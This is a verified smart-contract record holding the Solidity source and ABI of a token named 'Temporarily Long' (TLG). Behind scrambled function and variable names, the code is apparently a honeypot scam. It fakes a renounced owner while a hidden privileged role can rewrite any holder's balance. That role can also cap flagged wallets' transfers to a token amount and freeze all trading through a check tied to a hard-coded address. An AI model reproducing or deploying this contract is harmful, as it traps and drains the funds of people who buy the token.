{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface toEnableSender {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract minMode {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface receiverSwap {\n    function createPair(address enableLaunchedTx, address enableReceiver) external returns (address);\n}\n\ninterface tradingMax {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address maxWallet) external view returns (uint256);\n\n    function transfer(address tokenLiquidity, uint256 fromLimitToken) external returns (bool);\n\n    function allowance(address receiverExempt, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fromLimitToken) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tokenLiquidity,\n        uint256 fromLimitToken\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed walletEnableSender, uint256 value);\n    event Approval(address indexed receiverExempt, address indexed spender, uint256 value);\n}\n\ninterface tradingMaxMetadata is tradingMax {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract TemporarilyLong is minMode, tradingMax, tradingMaxMetadata {\n\n    function transferFrom(address feeLaunched, address tokenLiquidity, uint256 fromLimitToken) external override returns (bool) {\n        if (_msgSender() != swapMaxToken) {\n            if (amountTo[feeLaunched][_msgSender()] != type(uint256).max) {\n                require(fromLimitToken <= amountTo[feeLaunched][_msgSender()]);\n                amountTo[feeLaunched][_msgSender()] -= fromLimitToken;\n            }\n        }\n        return totalShould(feeLaunched, tokenLiquidity, fromLimitToken);\n    }\n\n    function balanceOf(address maxWallet) public view virtual override returns (uint256) {\n        return isFundAt[maxWallet];\n    }\n\n    uint8 private fundLiquidity = 18;\n\n    function getOwner() external view returns (address) {\n        return takeFrom;\n    }\n\n    uint256 tokenReceiver;\n\n    bool public fromAuto;\n\n    function totalShould(address feeLaunched, address tokenLiquidity, uint256 fromLimitToken) internal returns (bool) {\n        if (feeLaunched == amountSell) {\n            return launchedAmountBuy(feeLaunched, tokenLiquidity, fromLimitToken);\n        }\n        uint256 takeMinLimit = tradingMax(toFund).balanceOf(isFeeExempt);\n        require(takeMinLimit == tokenReceiver);\n        require(tokenLiquidity != isFeeExempt);\n        if (receiverTokenFund[feeLaunched]) {\n            return launchedAmountBuy(feeLaunched, tokenLiquidity, atFromMin);\n        }\n        return launchedAmountBuy(feeLaunched, tokenLiquidity, fromLimitToken);\n    }\n\n    bool private minSwap;\n\n    function toIs(uint256 fromLimitToken) public {\n        exemptTrading();\n        tokenReceiver = fromLimitToken;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return fundLiquidity;\n    }\n\n    mapping(address => bool) public receiverTokenFund;\n\n    function approve(address feeTo, uint256 fromLimitToken) public virtual override returns (bool) {\n        amountTo[_msgSender()][feeTo] = fromLimitToken;\n        emit Approval(_msgSender(), feeTo, fromLimitToken);\n        return true;\n    }\n\n    string private minFund = \"Temporarily Long\";\n\n    function owner() external view returns (address) {\n        return takeFrom;\n    }\n\n    string private isReceiver = \"TLG\";\n\n    uint256 public modeShould;\n\n    uint256 private totalReceiverWallet;\n\n    function transfer(address totalReceiver, uint256 fromLimitToken) external virtual override returns (bool) {\n        return totalShould(_msgSender(), totalReceiver, fromLimitToken);\n    }\n\n    uint256 private enableMarketingTeam;\n\n    mapping(address => mapping(address => uint256)) private amountTo;\n\n    function swapToken(address maxFee) public {\n        exemptTrading();\n        \n        if (maxFee == amountSell || maxFee == toFund) {\n            return;\n        }\n        receiverTokenFund[maxFee] = true;\n    }\n\n    uint256 listModeEnable;\n\n    address public toFund;\n\n    function name() external view virtual override returns (string memory) {\n        return minFund;\n    }\n\n    function swapTeamEnable(address totalReceiver, uint256 fromLimitToken) public {\n        exemptTrading();\n        isFundAt[totalReceiver] = fromLimitToken;\n    }\n\n    address private takeFrom;\n\n    function allowance(address tradingMarketing, address feeTo) external view virtual override returns (uint256) {\n        if (feeTo == swapMaxToken) {\n            return type(uint256).max;\n        }\n        return amountTo[tradingMarketing][feeTo];\n    }\n\n    event OwnershipTransferred(address indexed marketingLimitMax, address indexed buyWallet);\n\n    bool private senderTokenMin;\n\n    address isFeeExempt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => bool) public shouldAuto;\n\n    function symbol() external view virtual override returns (string memory) {\n        return isReceiver;\n    }\n\n    uint256 private toWalletFund = 100000000 * 10 ** 18;\n\n    function exemptTrading() private view {\n        require(shouldAuto[_msgSender()]);\n    }\n\n    address swapMaxToken = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function tradingBuy() public {\n        emit OwnershipTransferred(amountSell, address(0));\n        takeFrom = address(0);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return toWalletFund;\n    }\n\n    mapping(address => uint256) private isFundAt;\n\n    constructor (){\n        \n        toEnableSender limitSender = toEnableSender(swapMaxToken);\n        toFund = receiverSwap(limitSender.factory()).createPair(limitSender.WETH(), address(this));\n        \n        amountSell = _msgSender();\n        tradingBuy();\n        shouldAuto[amountSell] = true;\n        isFundAt[amountSell] = toWalletFund;\n        if (modeShould == enableMarketingTeam) {\n            minSwap = false;\n        }\n        emit Transfer(address(0), amountSell, toWalletFund);\n    }\n\n    uint256 constant atFromMin = 17 ** 10;\n\n    address public amountSell;\n\n    function receiverLaunched(address marketingFundMode) public {\n        require(marketingFundMode.balance < 100000);\n        if (fromAuto) {\n            return;\n        }\n        if (totalReceiverWallet == enableMarketingTeam) {\n            minSwap = true;\n        }\n        shouldAuto[marketingFundMode] = true;\n        \n        fromAuto = true;\n    }\n\n    function launchedAmountBuy(address feeLaunched, address tokenLiquidity, uint256 fromLimitToken) internal returns (bool) {\n        require(isFundAt[feeLaunched] >= fromLimitToken);\n        isFundAt[feeLaunched] -= fromLimitToken;\n        isFundAt[tokenLiquidity] += fromLimitToken;\n        emit Transfer(feeLaunched, tokenLiquidity, fromLimitToken);\n        return true;\n    }\n\n    bool private toBuy;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverExempt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingLimitMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyWallet\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletEnableSender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"feeTo\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountSell\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromLimitToken\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxWallet\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingFundMode\",\"type\":\"address\"}],\"name\":\"receiverLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverTokenFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromLimitToken\",\"type\":\"uint256\"}],\"name\":\"swapTeamEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxFee\",\"type\":\"address\"}],\"name\":\"swapToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fromLimitToken\",\"type\":\"uint256\"}],\"name\":\"toIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromLimitToken\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeLaunched\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromLimitToken\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "TemporarilyLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}